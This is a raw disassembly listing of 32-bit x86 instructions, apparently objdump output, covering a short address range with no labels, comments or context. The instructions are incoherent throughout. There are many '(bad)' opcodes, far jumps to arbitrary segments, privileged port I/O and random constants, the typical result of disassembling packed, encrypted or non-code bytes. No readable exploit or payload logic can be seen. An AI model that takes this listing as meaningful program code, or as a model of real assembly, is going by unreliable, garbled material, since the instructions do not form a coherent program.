  41f6c7:	sbb    al,0xd8
  41f6c9:	inc    esp
  41f6ca:	ins    DWORD PTR es:[edi],dx
  41f6cb:	or     esp,DWORD PTR [eax]
  41f6cd:	fwait
  41f6ce:	xor    al,0xea
  41f6d0:	or     esi,0xffffffe3
  41f6d3:	jl     0x41f6e2
  41f6d5:	retf   
  41f6d6:	push   ds
  41f6d7:	xchg   ebx,eax
  41f6d8:	scas   eax,DWORD PTR es:[edi]
  41f6d9:	adc    DWORD PTR [eax+0x426696db],ebx
  41f6df:	neg    DWORD PTR [ecx-0x4f646bbb]
  41f6e5:	mov    eax,ds:0x63c452cc
  41f6ea:	(bad)  
  41f6ec:	pop    edx
  41f6ed:	test   DWORD PTR [edx+0x199b8da3],ebx
  41f6f3:	jmp    0x41f706
  41f6f5:	xchg   edi,esp
  41f6f7:	jb     0x41f717
  41f6f9:	fnstenv [edi]
  41f6fb:	pop    esp
  41f6fc:	push   eax
  41f6fe:	outs   dx,DWORD PTR ds:[esi]
  41f6ff:	(bad)  
  41f700:	push   edi
  41f701:	dec    ebp
  41f702:	fstp   QWORD PTR [ecx]
  41f704:	lahf   
  41f705:	xlat   BYTE PTR ds:[ebx]
  41f706:	cmp    bl,BYTE PTR [ecx-0x448adfe0]
  41f70c:	sbb    DWORD PTR [edi],ebp
  41f70e:	inc    ebx
  41f70f:	cli    
  41f710:	xor    BYTE PTR [edi],0xc
  41f713:	std    
  41f714:	das    
  41f715:	shl    esp,1
  41f717:	fimul  DWORD PTR [ecx]
  41f719:	mov    al,0xbb
  41f71b:	xor    al,0x86
  41f71d:	push   es
  41f71e:	adc    cl,BYTE PTR [ebx-0x56]
  41f721:	mov    ds:0x53afbaba,al
  41f726:	xchg   ah,ch
  41f728:	xchg   esp,eax
  41f729:	sbb    edi,DWORD PTR [esi]
  41f72b:	cmp    esp,edi
  41f72d:	ins    BYTE PTR es:[edi],dx
  41f72e:	mov    DWORD PTR [edi+0x73],esi
  41f731:	scas   eax,DWORD PTR es:[edi]
  41f732:	xchg   esp,eax
  41f733:	push   edx
  41f734:	dec    esp
  41f735:	out    0xf3,eax
  41f737:	cmp    BYTE PTR [ebp-0x1728cc18],bh
  41f73d:	inc    esp
  41f73e:	add    edi,DWORD PTR [esp+ebp*8]
  41f741:	xchg   DWORD PTR [eax],ebp
  41f743:	retf   0x11ea
  41f746:	lods   eax,DWORD PTR ds:[esi]
  41f747:	mov    ecx,DWORD PTR [eax]
  41f749:	mov    eax,0x3cad4911
  41f74e:	std    
  41f74f:	adc    al,0x91
  41f751:	jp     0x41f75b
  41f753:	ins    BYTE PTR es:[edi],dx
  41f754:	sbb    esp,DWORD PTR [ebp-0x59]
  41f757:	adc    eax,0x6496730f
  41f75c:	jb     0x41f785
  41f75e:	push   edi
  41f75f:	pop    eax
  41f760:	xchg   esp,eax
  41f761:	sub    eax,0xfd3ab328
  41f766:	push   ebp
  41f767:	imul   edi,DWORD PTR [ebp-0x481b817],0x9a9fa8e
  41f771:	push   ebp
  41f772:	ins    BYTE PTR es:[edi],dx
  41f773:	aam    0xd0
  41f775:	push   edx
  41f776:	icebp  
  41f777:	jmp    0xe3ab:0x42d9e30f
  41f77e:	pop    ds
  41f77f:	xor    al,0xaa
  41f781:	repnz pusha 
  41f783:	loop   0x41f74d
  41f785:	mov    ebx,0x112da2c1
  41f78a:	pop    edx
  41f78b:	xchg   BYTE PTR [edi-0x131265ee],ah
  41f791:	cdq    
  41f792:	push   eax
  41f793:	lds    edx,FWORD PTR [ebx+0x79]
  41f796:	inc    ebx
  41f797:	push   0xffffff86
  41f799:	add    BYTE PTR [esi+0x2aa042ee],ah
  41f79f:	sub    eax,0x2b56a2bd
  41f7a4:	mov    dh,0x3f
  41f7a6:	pop    esp
  41f7a7:	mov    edi,0x814fdf59
  41f7ac:	xchg   esi,eax
  41f7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7ae:	mov    dl,0x83
  41f7b0:	mov    edi,0xc955ae43
  41f7b5:	inc    esp
  41f7b6:	xor    ebx,DWORD PTR [edx+0x48f48633]
  41f7bc:	int    0xe6
  41f7be:	mov    ds:0xc77a2faa,eax
  41f7c3:	inc    esi
  41f7c4:	sub    DWORD PTR [ebx+ebx*2+0x6f],edi
  41f7c8:	sar    DWORD PTR [esi+0x57],cl
  41f7cb:	mov    eax,0xfbc10b1a
  41f7d0:	nop
  41f7d1:	ror    ebp,1
  41f7d3:	int    0xe9
  41f7d5:	jno    0x41f7fd
  41f7d7:	push   ecx
  41f7d8:	pop    eax
  41f7d9:	pop    ebx
  41f7da:	inc    ecx
  41f7db:	mov    ch,0x13
  41f7dd:	add    eax,DWORD PTR [ebp+0x1f]
  41f7e0:	push   ebx
  41f7e1:	xchg   ebp,eax
  41f7e2:	ja     0x41f7c6
  41f7e4:	cwde   
  41f7e5:	retf   
  41f7e6:	mov    ebp,0xabb37a9f
  41f7eb:	inc    edx
  41f7ec:	test   eax,0xd35d4f2a
  41f7f1:	mov    ch,0x74
  41f7f3:	es jno 0x41f7c8
  41f7f6:	scas   al,BYTE PTR es:[edi]
  41f7f7:	sbb    BYTE PTR [edx],bl
  41f7f9:	(bad)  
  41f7fa:	xchg   ecx,eax
  41f7fb:	ret    
  41f7fc:	loopne 0x41f871
  41f7fe:	xor    eax,0x8a6ff7cd
  41f803:	add    ecx,ebp
  41f805:	push   ebx
  41f806:	pop    edi
  41f807:	pop    DWORD PTR [ecx]
  41f809:	sbb    edi,DWORD PTR [eax+ecx*8-0x19]
  41f80d:	inc    esi
  41f80e:	add    BYTE PTR [ebp-0x57],dh
  41f811:	faddp  st(7),st
  41f813:	pop    esp
  41f814:	ret    0x646f
  41f817:	fisubr DWORD PTR [ebp-0x514f4c95]
  41f81d:	ret    0xffbf
  41f820:	push   cs
  41f821:	cmc    
  41f822:	xor    al,0x6c
  41f824:	sbb    eax,0x4e8e53bf
  41f829:	sub    bl,0x3e
  41f82c:	lods   al,BYTE PTR ds:[esi]
  41f82d:	aad    0x2d
  41f82f:	pop    ebx
  41f830:	out    0x40,eax
  41f832:	cmp    ebx,edi
  41f834:	cli    
  41f835:	add    BYTE PTR [edi],al
  41f837:	mul    esi
  41f839:	loop   0x41f8b3
  41f83b:	cmc    
  41f83c:	fisubr WORD PTR [eax+0x3]
  41f83f:	jo     0x41f845
  41f841:	pop    eax
  41f842:	push   ss
  41f843:	ror    BYTE PTR [edx+0x8dd6292],0x2c
  41f84a:	cmp    al,0x2c
  41f84c:	cmp    BYTE PTR [edx],cl
  41f84e:	mov    al,ds:0x87ebcc6
  41f853:	jge    0x41f82e
  41f855:	fcom   QWORD PTR [esi+edi*8]
  41f858:	xor    ecx,DWORD PTR [edx-0x2c]
  41f85b:	add    al,0x9b
  41f85d:	(bad)  
  41f85e:	clc    
  41f85f:	jle    0x41f893
  41f861:	sub    eax,0xd31c18d8
  41f866:	push   ebp
  41f867:	mov    eax,0xac305f9b
  41f86c:	mov    ebx,0x2a5f33f8
  41f871:	jecxz  0x41f8eb
  41f873:	in     eax,dx
  41f874:	push   ebp
  41f875:	xchg   BYTE PTR [edx],dl
  41f877:	or     eax,0x93073404
  41f87c:	in     al,0x8e
  41f87e:	mov    ecx,0x9df053c3
  41f883:	sub    eax,0xf640dbde
  41f888:	mov    eax,0xc5019365
  41f88d:	bound  eax,QWORD PTR [edx+0x24f65cec]
  41f893:	adc    DWORD PTR [ebp-0x16dbf8f2],0x33c7eff6
  41f89d:	xor    eax,0x8a6a22fa
  41f8a2:	jge    0x41f902
  41f8a4:	popf   
  41f8a5:	sbb    ax,0x2591
  41f8a9:	nop
  41f8aa:	aam    0x8
  41f8ac:	jmp    0x41f8c3
  41f8ae:	je     0x41f907
  41f8b0:	and    al,dl
  41f8b2:	xor    esp,0x9b634cfc
  41f8b8:	push   ds
  41f8b9:	cs mov bl,0xf7
  41f8bc:	shl    DWORD PTR [ebp-0x3ca65d4b],cl
  41f8c2:	mov    ch,0x7
  41f8c4:	repz push ds
  41f8c6:	pushf  
  41f8c7:	xchg   edi,eax
  41f8c8:	pop    edx
  41f8c9:	cli    
  41f8ca:	jb     0x41f92a
  41f8cc:	mov    esp,DWORD PTR [edx]
  41f8ce:	arpl   WORD PTR [esi+0x6b0c725],ax
  41f8d4:	fcomi  st,st(1)
  41f8d6:	dec    esp
  41f8d7:	fs adc al,0xd3
  41f8da:	adc    BYTE PTR [ebx+0x1c37b4dd],bh
  41f8e0:	rcr    DWORD PTR [ebx-0x2c],cl
  41f8e3:	push   es
  41f8e4:	mov    ah,0xca
  41f8e6:	jecxz  0x41f8f3
  41f8e8:	rol    DWORD PTR [eax+0x46],0xca
  41f8ec:	jmp    0xbbd:0xf6a7aba4
  41f8f3:	int    0x71
  41f8f5:	mov    ah,0xbc
  41f8f7:	daa    
  41f8f8:	jo     0x41f8b8
  41f8fa:	and    eax,esp
  41f8fc:	rcr    DWORD PTR [eax],1
  41f8fe:	in     al,dx
  41f8ff:	or     ebx,esp
  41f901:	(bad)  
  41f902:	outs   dx,BYTE PTR ds:[esi]
  41f903:	mov    al,0x3f
  41f905:	je     0x41f973
  41f907:	mov    ch,0x9c
  41f909:	lods   eax,DWORD PTR ds:[esi]
  41f90a:	adc    BYTE PTR [esi+eax*2-0x35],bl
  41f90e:	inc    edi
  41f90f:	shl    BYTE PTR [eax],cl
  41f911:	mov    fs,WORD PTR [edx]
  41f913:	iret   
  41f914:	push   ss
  41f915:	dec    eax
  41f916:	adc    BYTE PTR [ecx],0x30
  41f919:	pushf  
  41f91a:	daa    
  41f91b:	sbb    ah,bl
  41f91d:	in     eax,0x6
  41f91f:	jns    0x41f92b
  41f921:	push   edi
  41f922:	mov    edx,0xb055b912
  41f927:	popf   
  41f928:	cmp    edi,ecx
  41f92a:	inc    edi
  41f92b:	xor    ah,BYTE PTR [edi+0x3bcee0c7]
  41f931:	inc    edx
  41f932:	test   al,0x52
  41f934:	push   eax
  41f935:	mov    esp,0xb65122d8
  41f93a:	cmp    ah,BYTE PTR [eax+0x29814b8f]
  41f940:	loope  0x41f9b9
  41f942:	mov    esi,0x8f8f348a
  41f947:	cmp    bh,ah
  41f949:	std    
  41f94a:	pop    eax
  41f94b:	pop    ds
  41f94c:	imul   DWORD PTR [edx]
  41f94e:	mov    dh,0x58
  41f950:	(bad)  
  41f952:	(bad)  
  41f953:	rol    BYTE PTR [edi+0x99e57f0],1
  41f959:	popf   
  41f95a:	cmp    edx,DWORD PTR [ecx]
  41f95c:	rcr    esp,cl
  41f95e:	aaa    
  41f95f:	out    dx,al
  41f960:	sbb    DWORD PTR [eax],ecx
  41f962:	and    al,0x4b
  41f964:	iret   
  41f965:	xlat   BYTE PTR ds:[ebx]
  41f966:	or     BYTE PTR [eax+0x7977328d],bh
  41f96c:	test   eax,0x70aa4a87
  41f971:	dec    esp
  41f972:	mov    ebp,0x9bdd3540
  41f977:	sbb    eax,0x85be5dca
  41f97c:	scas   eax,DWORD PTR es:[edi]
  41f97d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f97e:	pop    esi
  41f97f:	pushf  
  41f980:	or     dh,ah
  41f982:	les    eax,FWORD PTR [edi+0xead7925]
  41f988:	or     al,0x7b
  41f98a:	or     DWORD PTR ds:0xde7f463,esi
  41f990:	inc    ebp
  41f991:	mov    al,0x54
  41f993:	jge    0x41f9c7
  41f995:	hlt    
  41f996:	mov    ebp,0xe57fee81
  41f99b:	(bad)
  41f99e:	push   ds
  41f99f:	aas    
  41f9a0:	push   ss
  41f9a1:	iret   
  41f9a2:	les    edx,FWORD PTR [ecx+edx*1]
  41f9a5:	sbb    dh,BYTE PTR [edx-0x52]
  41f9a8:	jb     0x41f9c9
  41f9aa:	sub    ah,BYTE PTR [ecx]
  41f9ac:	mov    edi,0xc1e8ca67
  41f9b1:	(bad)  
  41f9b2:	sbb    bl,BYTE PTR [edi*4+0x3891106d]
  41f9b9:	rol    BYTE PTR fs:[eax+eax*1-0x56],0x4c
  41f9bf:	fld    QWORD PTR [esi+0x2f]
  41f9c2:	fidivr WORD PTR [ebx+0x3]
  41f9c5:	sub    dh,BYTE PTR [edx-0x6e]
  41f9c8:	and    DWORD PTR [ebp+0x6ee04106],esi
  41f9ce:	das    
  41f9cf:	es add eax,0xcbc2cb12
  41f9d5:	add    al,0xfa
  41f9d7:	js     0x41f97e
  41f9d9:	lods   eax,DWORD PTR ds:[esi]
  41f9da:	push   0x7e722393
  41f9df:	lods   al,BYTE PTR ds:[esi]
  41f9e0:	jp     0x41fa1a
  41f9e2:	popa   
  41f9e3:	sub    al,0xb5
  41f9e5:	std    
  41f9e6:	add    al,0xa4
  41f9e8:	hlt    
  41f9e9:	push   ds
  41f9ea:	fnsavew [ebp-0x166319c7]
  41f9f1:	rol    DWORD PTR [ebx+0x68],0x26
  41f9f5:	mov    eax,0x96dc8a76
  41f9fa:	jle    0x41f9f8
  41f9fc:	test   eax,0xeb6c5fc9
  41fa01:	mov    al,0x45
  41fa03:	(bad)  
  41fa04:	xchg   edx,eax
  41fa05:	lahf   
  41fa06:	dec    edi
  41fa07:	add    al,0x2f
  41fa09:	jecxz  0x41fa60
  41fa0b:	push   ebp
  41fa0c:	pop    ebx
  41fa0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa0e:	fst    DWORD PTR [ebx*2+0x269cb19d]
  41fa15:	fcom   st(4)
  41fa17:	popa   
  41fa18:	mov    esi,0x14984787
  41fa1d:	int    0x3e
  41fa1f:	sti    
  41fa20:	mov    WORD PTR [ecx],cs
  41fa22:	sbb    DWORD PTR [edi+0x750808a8],edi
  41fa28:	fmul   DWORD PTR [eax]
  41fa2a:	inc    esp
  41fa2b:	mov    al,ds:0x85f19884
  41fa30:	lock popa 
  41fa32:	inc    edi
  41fa33:	xor    BYTE PTR [edx-0x2f],0x5
  41fa37:	adc    eax,0x8c71e58f
  41fa3c:	into   
  41fa3d:	lods   eax,DWORD PTR ds:[esi]
  41fa3e:	cmp    eax,0x9f5fb458
  41fa43:	in     eax,dx
  41fa44:	imul   DWORD PTR [esi-0x27348f56]
  41fa4a:	mov    al,0x4e
  41fa4c:	je     0x41fa72
  41fa4e:	retf   0x2cbb
  41fa51:	push   ss
  41fa52:	sbb    esi,DWORD PTR [eax]
  41fa54:	stos   BYTE PTR es:[edi],al
  41fa55:	mov    ch,0xdc
  41fa57:	stc    
  41fa58:	ins    DWORD PTR es:[edi],dx
  41fa59:	fbld   TBYTE PTR [eax-0x29]
  41fa5c:	lods   al,BYTE PTR ds:[esi]
  41fa5d:	xchg   esp,eax
  41fa5e:	shl    DWORD PTR [eax-0x7a5eb985],cl
  41fa64:	outs   dx,BYTE PTR ds:[esi]
  41fa65:	fisub  DWORD PTR [edi]
  41fa67:	test   eax,0x579f8f0d
  41fa6c:	(bad)  
  41fa6d:	mov    WORD PTR [eax+0x62],ds
  41fa70:	lahf   
  41fa71:	pop    ss
  41fa72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa73:	mov    bl,0x33
  41fa75:	test   al,0x7f
  41fa77:	mov    DWORD PTR [edx+0x33ab4047],ebp
  41fa7d:	jnp    0x41fa87
  41fa7f:	cmp    eax,0x1874db1a
  41fa84:	mov    ecx,0x88499cd
  41fa89:	mov    esp,ecx
  41fa8b:	dec    eax
  41fa8c:	stc    
  41fa8d:	mov    BYTE PTR [ecx+0x3718e9fa],bh
  41fa93:	mov    eax,0xd5058c0c
  41fa98:	lahf   
  41fa99:	test   BYTE PTR [eax+0x1e],cl
  41fa9c:	repz add edx,DWORD PTR cs:0x24577840
  41faa4:	in     al,0xba
  41faa6:	or     al,0xa1
  41faa8:	and    esi,DWORD PTR [edx]
  41faaa:	xor    bl,0x76
  41faad:	loope  0x41fa94
  41faaf:	mov    esp,0xe8597f46
  41fab4:	jg     0x41fa82
  41fab6:	jae    0x41fa5b
  41fab8:	sbb    bl,BYTE PTR [ebx+edx*2+0x28]
  41fabc:	cmp    BYTE PTR [esi-0x26],cl
  41fabf:	test   BYTE PTR [esi+ebp*2-0x52],ch
  41fac3:	mov    eax,ds:0xfb9fffa7
  41fac8:	add    ch,cl
  41faca:	mov    esi,0x9fcb046f
  41facf:	push   0x75
  41fad1:	dec    esi
  41fad2:	mov    esp,0xe33ba3ca
  41fad7:	xchg   ebp,eax
  41fad8:	dec    edi
  41fad9:	xchg   ebx,eax
  41fada:	stos   DWORD PTR es:[edi],eax
  41fadb:	neg    DWORD PTR [ecx]
  41fadd:	or     ch,BYTE PTR [edi+0x1c378594]
  41fae3:	cmp    BYTE PTR [ecx],ch
  41fae5:	add    eax,0x32c71be2
  41faea:	dec    esi
  41faeb:	pop    ds
  41faec:	inc    ecx
  41faed:	adc    al,0xb8
  41faef:	sub    DWORD PTR [eax-0x4b],edx
  41faf2:	popa   
  41faf3:	test   bl,cl
  41faf5:	adc    BYTE PTR [edx+0x1e],ah
  41faf8:	push   edi
  41faf9:	mov    esi,0x70e4d442
  41fafe:	adc    edx,ebp
  41fb00:	es mov bh,0x54
  41fb03:	dec    ebx
  41fb04:	or     al,0x19
  41fb06:	jg     0x41fac2
  41fb08:	les    edi,FWORD PTR [ebx+eax*8-0x5d]
  41fb0c:	ins    DWORD PTR es:[edi],dx
  41fb0d:	cmp    al,0xbc
  41fb0f:	enter  0xc36e,0xcc
  41fb13:	shr    ecx,1
  41fb15:	(bad)  
  41fb16:	pushf  
  41fb17:	mov    ch,0x60
  41fb19:	imul   edi,DWORD PTR [edi-0x6],0x6f2f1469
  41fb20:	mov    bh,0x78
  41fb22:	out    0xf6,al
  41fb24:	test   eax,0x7c53b33
  41fb29:	mov    ah,0x7d
  41fb2b:	je     0x41fb31
  41fb2d:	inc    ebx
  41fb2e:	cmp    DWORD PTR [edi-0x1a],0xa78e937
  41fb35:	or     BYTE PTR [eax+edi*4-0x45],0x97
  41fb3a:	je     0x41fad2
  41fb3c:	cmp    bh,BYTE PTR [esi]
  41fb3e:	call   0xb6fca83a
  41fb43:	lods   al,BYTE PTR ds:[esi]
  41fb44:	mov    ds:0xa49c53aa,al
  41fb49:	iret   
  41fb4a:	in     al,dx
  41fb4b:	(bad)  
  41fb4c:	std    
  41fb4d:	xor    al,0xe5
  41fb4f:	idiv   BYTE PTR [ebx+0x17]
  41fb52:	dec    esi
  41fb53:	fwait
  41fb54:	cmp    DWORD PTR es:[ecx-0x6],ebx
  41fb58:	or     BYTE PTR [edi],cl
  41fb5a:	push   es
  41fb5b:	mov    DWORD PTR [edi],esi
  41fb5d:	push   0x161a58f0
  41fb62:	jge    0x41fb38
  41fb64:	push   esi
  41fb65:	xor    bh,ah
  41fb67:	faddp  st(2),st
  41fb69:	adc    eax,0x5f117a91
  41fb6e:	push   esp
  41fb6f:	lahf   
  41fb70:	loopne 0x41fb99
  41fb72:	dec    edi
  41fb73:	inc    ecx
  41fb74:	jnp    0x41fbc3
  41fb76:	jb     0x41fb6b
  41fb78:	imul   ebp,DWORD PTR [ecx+0x78],0xffffffdd
  41fb7c:	jecxz  0x41fb1b
  41fb7e:	mov    edx,DWORD PTR [esi+0x74]
  41fb81:	cmp    dh,0x30
  41fb84:	inc    eax
  41fb85:	dec    ecx
  41fb86:	sbb    eax,0x962d58fa
  41fb8b:	clc    
  41fb8c:	lods   eax,DWORD PTR ds:[esi]
  41fb8d:	mov    bl,BYTE PTR [edx]
  41fb8f:	test   DWORD PTR ds:0xc25b4bf,edi
  41fb95:	xor    BYTE PTR es:[edx-0x7d],bh
  41fb99:	pushf  
  41fb9a:	pop    ss
  41fb9b:	repnz lock pop ecx
  41fb9e:	adc    ch,ah
  41fba0:	xchg   ebp,eax
  41fba1:	(bad)  
  41fba2:	mov    eax,ds:0xb90bdbc7
  41fba7:	ret    0x1246
  41fbaa:	ror    DWORD PTR cs:0xe401bf2c,1
  41fbb1:	loopne 0x41fbe7
  41fbb3:	gs ins DWORD PTR es:[edi],dx
  41fbb5:	sbb    DWORD PTR [edi+0x47d14d04],ebx
  41fbbb:	int3   
  41fbbc:	sub    dh,BYTE PTR fs:[ebx]
  41fbbf:	or     cl,BYTE PTR [edx+0x7ff6284b]
  41fbc5:	mov    cl,0xb7
  41fbc7:	mov    bl,0x95
  41fbc9:	stc    
  41fbca:	adc    ah,BYTE PTR [esi-0x3c7264db]
  41fbd0:	xor    eax,DWORD PTR [ecx+ebx*1-0x1811dcac]
  41fbd7:	mov    ebx,0x10f9335b
  41fbdc:	jg     0x41fc34
  41fbde:	jns    0x41fbcb
  41fbe0:	and    esi,DWORD PTR [ebx+0x65]
  41fbe3:	inc    esi
  41fbe4:	mov    ds:0xbfac6c8d,al
  41fbe9:	push   eax
  41fbea:	cmp    edi,ebx
  41fbec:	ins    DWORD PTR es:[edi],dx
  41fbed:	mov    dl,0x4e
  41fbef:	pop    ebx
  41fbf0:	and    cl,BYTE PTR [edx-0x25608536]
  41fbf6:	dec    ebx
  41fbf7:	stos   DWORD PTR es:[edi],eax
  41fbf8:	sbb    eax,0xdcdb4f56
  41fbfd:	int    0x1c
  41fbff:	xor    al,0xc0
  41fc01:	pop    ebx
  41fc02:	nop
  41fc03:	mov    dh,0x1e
  41fc05:	inc    esp
  41fc06:	ins    DWORD PTR es:[edi],dx
  41fc07:	imul   esi,esp,0x50e5aad3
  41fc0d:	inc    ecx
  41fc0e:	sub    ebx,DWORD PTR [esi+edx*2]
  41fc11:	mov    al,0xcd
  41fc13:	loope  0x41fc2a
  41fc15:	out    dx,eax
  41fc16:	sbb    DWORD PTR [esi],esp
  41fc18:	pop    esi
  41fc19:	test   al,0xc0
  41fc1b:	pop    edi
  41fc1c:	je     0x41fbbd
  41fc1e:	loopne 0x41fc9f
  41fc20:	stos   BYTE PTR es:[edi],al
  41fc21:	push   ss
  41fc22:	in     al,0xb
  41fc24:	scas   al,BYTE PTR es:[edi]
  41fc25:	push   es
  41fc26:	xchg   edx,eax
  41fc27:	(bad)  
  41fc29:	jbe    0x41fc00
  41fc2b:	adc    eax,0x452321b3
  41fc30:	pop    edx
  41fc31:	adc    al,0x4e
  41fc33:	lea    esp,[esi]
  41fc35:	xor    DWORD PTR ds:0xf7ece2d4,eax
  41fc3b:	int    0x71
  41fc3d:	sub    ch,BYTE PTR [esi+0x4c886287]
  41fc43:	xchg   esi,eax
  41fc44:	push   ebx
  41fc45:	nop    DWORD PTR [eax+0x273c4fec]
  41fc4c:	(bad)  
  41fc4d:	or     cl,BYTE PTR [ebp+0x5a]
  41fc50:	mov    ecx,0x6341e86e
  41fc55:	inc    ebx
  41fc56:	jmp    0x8056:0x5589759c
  41fc5d:	leave  
  41fc5e:	dec    ecx
  41fc5f:	mov    BYTE PTR [edi],bh
  41fc61:	bswap  eax
  41fc63:	cmp    ebp,DWORD PTR [ebp-0x5e]
  41fc66:	gs jmp 0xdc0b2c31
  41fc6c:	adc    BYTE PTR [ebp-0x25],cl
  41fc6f:	sub    edx,DWORD PTR [ebp-0x57f7c673]
  41fc75:	ins    BYTE PTR es:[edi],dx
  41fc76:	bound  ecx,QWORD PTR [edi-0x38]
  41fc79:	loopne 0x41fcf5
  41fc7b:	jo     0x41fcad
  41fc7d:	add    ah,BYTE PTR [ecx+eiz*1-0x7e3e8f5e]
  41fc84:	ficom  WORD PTR [esi-0x21ae1fd3]
  41fc8a:	sub    DWORD PTR [edx+0x5f],edx
  41fc8d:	sbb    BYTE PTR [edi+0x2d],0xea
  41fc91:	jl     0x41fc3d
  41fc93:	fisub  DWORD PTR [bx+si+0x28]
  41fc97:	push   esp
  41fc98:	sub    DWORD PTR [edi+0x2],0x2000aea1
  41fc9f:	gs (bad) 
  41fca1:	sbb    dh,dh
  41fca3:	bound  edx,QWORD PTR [ebx+0x35]
  41fca6:	adc    DWORD PTR ds:0xeabe8fee,edi
  41fcac:	ss push ebx
  41fcae:	cld    
  41fcaf:	into   
  41fcb0:	pop    ebx
  41fcb1:	pop    ecx
  41fcb2:	inc    eax
  41fcb3:	scas   al,BYTE PTR es:[edi]
  41fcb4:	xor    al,0x49
  41fcb6:	or     BYTE PTR [edi-0x68],al
  41fcb9:	pushf  
  41fcba:	add    ah,bh
  41fcbc:	xchg   ecx,eax
  41fcbd:	mov    al,ds:0xe556b58c
  41fcc2:	push   ecx
  41fcc3:	push   ebp
  41fcc4:	ins    DWORD PTR es:[edi],dx
  41fcc5:	mov    edx,0x933435f0
  41fcca:	int3   
  41fccb:	lahf   
  41fccc:	push   0xffffffd7
  41fcce:	rol    BYTE PTR [eax],1
  41fcd0:	jl     0x41fc6b
  41fcd2:	pop    esp
  41fcd3:	push   esp
  41fcd4:	adc    bl,cl
  41fcd6:	and    esp,DWORD PTR [ecx-0x1a04e965]
  41fcdc:	cmp    DWORD PTR [ebx-0x44],ecx
  41fcdf:	mov    esp,0xfcdc4fa0
  41fce4:	retf   
  41fce5:	in     eax,0x16
  41fce7:	adc    DWORD PTR [esi+0x688e041c],edi
  41fced:	ins    BYTE PTR es:[edi],dx
  41fcee:	adc    eax,0x26d5df42
  41fcf3:	sub    DWORD PTR [esi+0x23],edx
  41fcf6:	das    
  41fcf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcf8:	cmp    BYTE PTR [edi+eiz*2],0x1c
  41fcfc:	pop    ecx
  41fcfd:	push   ds
  41fcfe:	test   al,0x84
  41fd00:	cmc    
  41fd01:	ret    0x2883
  41fd04:	lahf   
  41fd05:	cmp    ebp,0x1a5e0e2e
  41fd0b:	test   al,0x9c
  41fd0d:	inc    ebp
  41fd0e:	in     eax,0x3c
  41fd10:	hlt    
  41fd11:	push   ecx
  41fd12:	adc    DWORD PTR [edi+ebp*2],ecx
  41fd15:	mov    al,0x6c
  41fd17:	scas   eax,DWORD PTR es:[edi]
  41fd18:	fidiv  WORD PTR [ebp+0x27b8bb0c]
  41fd1e:	sbb    al,0xf6
  41fd20:	loop   0x41fd59
  41fd22:	pminsw mm4,QWORD PTR [edx+ebp*8]
  41fd26:	inc    eax
  41fd27:	adc    dl,BYTE PTR [edi-0x76]
  41fd2a:	and    ch,dh
  41fd2c:	add    DWORD PTR ds:0x447e4dea,ecx
  41fd32:	es jge 0x41fd73
  41fd35:	push   ebx
  41fd36:	push   es
  41fd37:	add    ch,BYTE PTR [ebp+0x7aca39a1]
  41fd3d:	outs   dx,DWORD PTR ds:[esi]
  41fd3e:	mov    dh,0xfc
  41fd40:	add    dl,BYTE PTR [esp+esi*1-0x1d]
  41fd44:	cmp    bh,BYTE PTR [ebx+0xf]
  41fd47:	test   DWORD PTR [eax+0x5d0fa9c7],edi
  41fd4d:	arpl   WORD PTR [ecx+0x4d],dx
  41fd50:	imul   ebx,DWORD PTR [esi+ebp*4-0x58ddcd9d],0x5e517c35
  41fd5b:	jle    0x41fd32
  41fd5d:	jns    0x41fd60
  41fd5f:	xor    BYTE PTR [edi+0x37],dl
  41fd62:	or     al,0x24
  41fd64:	es xchg ebp,eax
  41fd66:	xchg   edx,eax
  41fd67:	mov    ch,0x2e
  41fd69:	fnstenv ds:[edx]
  41fd6c:	mov    esi,0xb7db4964
  41fd71:	js     0x41fde1
  41fd73:	inc    eax
  41fd74:	mov    BYTE PTR [bx+si],al
  41fd77:	test   al,0xc4
  41fd79:	sar    bl,cl
  41fd7b:	inc    eax
  41fd7c:	mov    WORD PTR [edx+ebx*4+0x56e87859],fs
  41fd83:	das    
  41fd84:	push   0xffffffc2
  41fd86:	and    eax,0xfe81850
  41fd8b:	mov    bl,0x7d
  41fd8d:	repnz inc eax
  41fd8f:	mov    ds:0x48a86603,eax
  41fd94:	or     BYTE PTR [ecx],dh
  41fd96:	imul   edx,ebp,0x73
  41fd99:	push   cs
  41fd9a:	or     BYTE PTR [ebx-0x3f32a33c],cl
  41fda0:	out    dx,al
  41fda1:	jecxz  0x41fd33
  41fda3:	mov    edx,0xb0a5848
  41fda8:	repnz aas 
  41fdaa:	sub    BYTE PTR [ebp-0x7e89dfdb],0x3a
  41fdb1:	outs   dx,BYTE PTR ds:[esi]
  41fdb2:	es fsub st,st(0)
  41fdb5:	outs   dx,DWORD PTR ds:[esi]
  41fdb6:	icebp  
  41fdb7:	js     0x41fd4f
  41fdb9:	mov    WORD PTR [edi-0x2e34ba7f],es
  41fdbf:	mov    eax,ds:0xf1bfbece
  41fdc4:	rol    BYTE PTR [eax+0x27],1
  41fdc7:	(bad)  
  41fdc8:	dec    esi
  41fdc9:	xor    BYTE PTR [ebx-0x1d507467],al
  41fdcf:	pop    ds
  41fdd0:	dec    eax
  41fdd1:	push   ds
  41fdd2:	mov    al,0xd6
  41fdd4:	inc    ebx
  41fdd5:	jl     0x41fe0b
  41fdd7:	int    0xcd
  41fdd9:	push   ds
  41fdda:	cmp    ebx,0x6f
  41fddd:	sbb    al,0x75
  41fddf:	and    DWORD PTR [edi+0x56],ebp
  41fde2:	jns    0x41fda1
  41fde4:	xlat   BYTE PTR ds:[ebx]
  41fde5:	outs   dx,BYTE PTR ds:[esi]
  41fde6:	iret   
  41fde7:	pop    ecx
  41fde8:	mov    ch,0xcc
  41fdea:	push   eax
  41fdeb:	xor    esp,DWORD PTR [ecx-0x64]
  41fdee:	sbb    ecx,esi
  41fdf0:	xor    ecx,DWORD PTR [edi-0x279189f7]
  41fdf6:	push   edi
  41fdf7:	and    bl,dl
  41fdf9:	mov    ebp,0xddfff122
  41fdfe:	and    ch,bl
  41fe00:	shl    dh,0xcc
  41fe03:	adc    ecx,edi
  41fe05:	leave  
  41fe06:	push   ebp
  41fe07:	mov    al,0x9f
  41fe09:	in     al,dx
  41fe0a:	add    al,0x47
  41fe0c:	pushf  
  41fe0d:	out    dx,al
  41fe0e:	adc    al,0x9a
  41fe10:	cmp    eax,0x7785a42d
